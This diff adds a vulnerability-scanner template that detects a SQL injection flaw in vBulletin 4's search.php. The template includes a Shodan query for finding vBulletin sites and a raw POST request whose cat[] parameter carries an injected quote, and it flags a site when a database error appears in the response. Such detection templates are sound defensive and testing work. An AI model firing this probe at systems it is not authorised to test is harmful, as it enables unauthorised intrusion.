@@ -1,0 +1,37 @@
+id: vbulletin-search-sqli
+info:
+  name: vBulletin Search.php SQL Injection
+  author: MaStErChO
+  severity: high
+  description: |
+    vBulletin 4 is vulnerable to an SQL injection vulnerability, which may allow an attacker can execute malicious SQL statements that control a web application's database server.
+  reference:
+    - https://www.exploit-db.com/exploits/17314
+    - https://web.archive.org/web/20181129123620/https://j0hnx3r.org/vbulletin-4-x-sql-injection-vulnerability/
+  tags: vbulletin, ajaxreg, sql-injection
+  metadata:
+    max-request: 1
+    shodan-query: http.component:"vBulletin"
+
+
+http:
+  - raw:
+      - |
+        POST /search.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        contenttypeid=7&do=process&humanverify=1&cat[]=-1%27
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "type=dberror"
+
+      - type: status
+        status:
+          - 200
+          - 503
+        condition: or
